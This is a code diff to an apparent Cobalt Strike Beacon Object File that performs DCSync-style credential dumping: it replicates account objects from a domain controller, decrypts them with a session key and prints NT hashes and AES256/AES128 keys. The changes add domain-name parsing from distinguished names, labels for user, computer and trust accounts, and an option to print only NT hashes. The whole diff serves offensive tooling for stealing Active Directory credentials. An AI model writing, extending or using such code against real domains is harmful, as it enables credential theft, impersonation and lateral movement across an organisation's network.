@@ -635,7 +635,7 @@ DWORD GetRIDFromSID(const BYTE* sid, DWORD sidLen) {
     return rid;
 }
 
-void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, const char* dcHostname, const BYTE* sessionKey, DWORD sessionKeyLen) {
+void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, const char* distinguishedName, const char* dcHostname, const BYTE* sessionKey, DWORD sessionKeyLen, int onlyNT) {
     if (!objects) return;
     
     char ntHash[33] = {0};
@@ -863,11 +863,58 @@ void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, con
         current = current->pNextEntInf;
     }
     
-    OUTPUT_PRINT("\n[+] Results:");
-    OUTPUT_PRINT("  %s", samAccountName);
+    // Extract domain from DN (DC=child,DC=contoso,DC=local -> child.contoso.local)
+    char domainName[256] = {0};
+    DWORD domainLen = 0;
+    if (distinguishedName) {
+        const char* p = distinguishedName;
+        while (*p) {
+            // Find "DC=" or "dc="
+            if ((p[0] == 'D' || p[0] == 'd') && (p[1] == 'C' || p[1] == 'c') && p[2] == '=') {
+                p += 3; // Skip "DC="
+                // Add separator if not first component
+                if (domainLen > 0 && domainLen < 255) {
+                    domainName[domainLen++] = '.';
+                }
+                // Copy until comma or end
+                while (*p && *p != ',' && domainLen < 255) {
+                    domainName[domainLen++] = *p++;
+                }
+            } else {
+                p++;
+            }
+        }
+        domainName[domainLen] = '\0';
+    }
+    
+    if (accountType == SAM_USER_OBJECT) {
+        if (domainLen > 0)
+            OUTPUT_PRINT("\n[*] User: %s\\%s", domainName, samAccountName);
+        else
+            OUTPUT_PRINT("\n[*] User: %s", samAccountName);
+    } else if (accountType == SAM_MACHINE_ACCOUNT) {
+        if (domainLen > 0)
+            OUTPUT_PRINT("\n[*] Computer: %s\\%s", domainName, samAccountName);
+        else
+            OUTPUT_PRINT("\n[*] Computer: %s", samAccountName);
+    } else if (accountType == SAM_TRUST_ACCOUNT) {
+        if (domainLen > 0)
+            OUTPUT_PRINT("\n[*] Trust account: %s\\%s", domainName, samAccountName);
+        else
+            OUTPUT_PRINT("\n[*] Trust account: %s", samAccountName);
+    } else {
+        if (domainLen > 0)
+            OUTPUT_PRINT("\n[*] Object: %s\\%s", domainName, samAccountName);
+        else
+            OUTPUT_PRINT("\n[*] Object: %s", samAccountName);
+    }
+
+    // OUTPUT_PRINT("  %s", samAccountName);
     if (foundNT) OUTPUT_PRINT("  nt:\t%s", ntHash);
-    if (foundAES256) OUTPUT_PRINT("  aes256:\t%s", aes256Key);
-    if (foundAES128) OUTPUT_PRINT("  aes128:\t%s", aes128Key);
+    if (!onlyNT) {
+        if (foundAES256) OUTPUT_PRINT("  aes256:\t%s", aes256Key);
+        if (foundAES128) OUTPUT_PRINT("  aes128:\t%s", aes128Key);
+    }
 }
 
 void go(char *args, int alen) {
@@ -880,6 +927,7 @@ void go(char *args, int alen) {
     char* ouPath = ValidateInput(BeaconDataExtract(&parser, NULL));
     char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
     int useLdaps = BeaconDataInt(&parser);
+    int onlyNT = BeaconDataInt(&parser);
     
     // Variables for cleanup
     RPC_BINDING_HANDLE rpcBinding = NULL;
@@ -1046,7 +1094,7 @@ void go(char *args, int alen) {
     }
 
     // Process and decrypt credentials
-    ProcessCredentials(objects, userInfo->samAccountName, dcHostname, sessionKey, sessionKeyLen);
+    ProcessCredentials(objects, userInfo->samAccountName, userInfo->distinguishedName, dcHostname, sessionKey, sessionKeyLen, onlyNT);
     
     
 cleanup:
